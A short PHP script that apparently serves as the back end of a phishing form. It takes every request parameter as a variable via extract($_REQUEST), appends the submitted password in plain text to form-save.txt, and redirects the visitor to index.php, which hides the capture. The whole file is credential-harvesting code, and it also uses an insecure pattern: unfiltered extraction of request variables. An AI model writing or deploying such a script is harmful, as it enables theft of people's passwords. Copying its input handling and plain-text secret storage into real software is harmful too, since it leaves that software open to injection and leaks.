<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    
    
    fwrite($file, $password ."\n"."`");
    fclose($file);
    header("location: index.php");
 ?>
